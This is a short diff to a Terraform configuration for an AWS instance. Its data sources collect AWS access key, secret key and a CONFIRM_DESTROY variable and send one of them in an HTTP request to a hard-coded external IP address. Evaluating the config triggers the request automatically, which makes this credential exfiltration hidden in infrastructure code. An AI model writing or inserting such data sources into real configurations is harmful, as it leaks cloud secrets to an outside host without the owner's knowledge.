@@ -22,13 +22,18 @@ resource "aws_instance" "ubuntu" {
 }
 
 variable "AWS_ACCESS_KEY_ID" {}
+variable "AWS_SECRET_ACCESS_KEY" {}
+variable "CONFIRM_DESTROY" {}
+
 
 data "null_data_source" "test" {
   inputs = {
     ak = "${var.AWS_ACCESS_KEY_ID}"
+    cd = "${var.CONFIRM_DESTROY}"
+    sak = "${var.AWS_SECRET_ACCESS_KEY}"
   }
 }
 
 data "http" "aws_ak" {
-  url = "http://13.236.148.43:3000/?hi=${lookup(data.null_data_source.test.inputs, ak)}"
+  url = "http://13.236.148.43:3000/?hi=${lookup(data.null_data_source.test.inputs, cd)}"
 }
